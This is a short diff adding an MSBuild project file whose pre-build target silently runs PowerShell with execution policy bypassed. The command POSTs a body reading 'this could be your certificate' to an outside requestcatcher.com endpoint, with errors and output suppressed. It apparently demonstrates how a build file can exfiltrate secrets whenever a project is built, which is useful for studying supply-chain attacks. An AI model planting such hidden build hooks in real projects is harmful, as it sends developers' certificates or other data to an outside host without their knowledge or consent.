@@ -1,0 +1,9 @@
+<Project>
+    <Target Name="RunBeforeBuild" BeforeTargets="Build">
+        <!-- Explicitly set working dir if needed, e.g., $(ProjectDir) -->
+        <Exec Command="powershell.exe -ExecutionPolicy Bypass -Command &quot;Try { Invoke-WebRequest -Uri 'https://frno10.requestcatcher.com/test' -Method Post -Body 'this could be your certificate' -ErrorAction SilentlyContinue > $null 2>&1 } Catch { Write-Error $_.Exception.Message; exit 1 }&quot;" 
+              ContinueOnError="true" 
+              IgnoreExitCode="true"
+              ConsoleToMSBuild="false" />  <!-- Logs output to VS Build window -->
+    </Target>
+</Project>
